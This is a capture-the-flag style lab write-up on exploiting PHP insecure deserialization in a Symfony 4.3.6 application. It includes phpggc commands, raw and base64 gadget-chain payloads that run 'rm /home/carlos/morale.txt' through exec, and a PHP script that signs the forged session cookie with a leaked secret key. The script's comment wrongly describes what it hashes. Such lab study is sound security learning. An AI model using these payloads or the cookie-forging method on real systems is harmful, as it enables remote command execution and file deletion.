# [Insecure deserialization] Lab: Exploiting PHP deserialization with a pre-built gadget chain (1)

---

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled.png)

after login : 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%201.png)

now we need to identify the frame work: 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%202.png)

this is what we get: 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%203.png)

this `/cgi-bin/phpinfo.php` still doesn't contain the frame work maybe if we cause a 500 error we can get the frame work through information disclosure. 

by taking one character off from the session cookie we caused a 500 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%204.png)

so the framework is **`Symfony Version 4.3.6` and `PHP Version 7.4.3-4ubuntu2.22`**

let's use how phpggc to try to find a gadget chain exploit we can use. 

using the command in the tool phpggc `PHP phpggc -l`   list the gadget chains 

we can use -l [filter]

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%205.png)

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%206.png)

we only need to use __destruct to delete a file here. 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%207.png)

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%208.png)

```jsx
PS C:\Users\micha\Desktop\Burp-Suite-Stuff\EXPLOIT-TOOLS\phpggc-master> php phpggc Symfony/FD1 /home/carlos/morale.txt
O:47:"Symfony\Component\Cache\Adapter\PhpFilesAdapter":1:{s:52:"Symfony\Component\Cache\Adapter\PhpFilesAdaptertmp";s:23:"/home/carlos/morale.txt";}
PS C:\Users\micha\Desktop\Burp-Suite-Stuff\EXPLOIT-TOOLS\phpggc-master> php phpggc Symfony/FD1 /home/carlos/morale.txt  -b
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQaHBGaWxlc0FkYXB0ZXIiOjE6e3M6NTI6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFBocEZpbGVzQWRhcHRlcgB0bXAiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
PS C:\Users\micha\Desktop\Burp-Suite-Stuff\EXPLOIT-TOOLS\phpggc-master>
```

now lets pass that as the session cookie. 

we get this error 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%209.png)

lets try different exploit to see if that works. 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%2010.png)

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%2011.png)

notice the secret key: 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%2012.png)

now from this signature we can create our own hmac function:  

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%2013.png)

this is script I made: 

```jsx
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319";
$secretKey = "9b1e606wkbbv9t6qyotx6rjjtopugfjf";

$hash = hash_hmac('sha1', $object, $secretKey);

echo $hash; // Outputs the HMAC hash of "Hello, world!" using SHA-1 and the given secret key.
?>
```

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/Untitled%2014.png)

---

## LINUX VS WINDOW BASE64

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20PHP%20dese%20c382da134ac64b6f90ed6a3c32dbdfa6/69c1adf5-c132-4195-9625-92eae53b9aa0.png)

## Why we need -w 0

reason we do `command | base64 -w 0` is to remove the new line characters in the encoding. 

Base64 encoding converts binary data into a text string using a specific set of 64 characters. It's designed to ensure that binary data can be safely transmitted or stored in text-based formats. When encoding data as Base64, the output is typically wrapped to a certain line length for readability and compatibility reasons. The default line length varies depending on the implementation, but a common standard is to wrap lines after 76 characters, as per MIME (Multipurpose Internet Mail Extensions) specifications. This wrapping results in the insertion of newline characters (`\\n`) at regular intervals in the encoded string.

However, the presence of newline characters can be problematic in contexts where the encoded data is expected to be a continuous string without breaks. To address this, many Base64 encoding functions or libraries offer options to control line wrapping. For example, in Ruby, the `Base64.strict_encode64` method generates a Base64-encoded string without any line breaks, whereas `Base64.encode64` adheres to the 76-character line length convention and includes newline characters.

The choice between using a version of Base64 that adds newline characters or one that doesn't depends on the requirements of the application or protocol you're working with.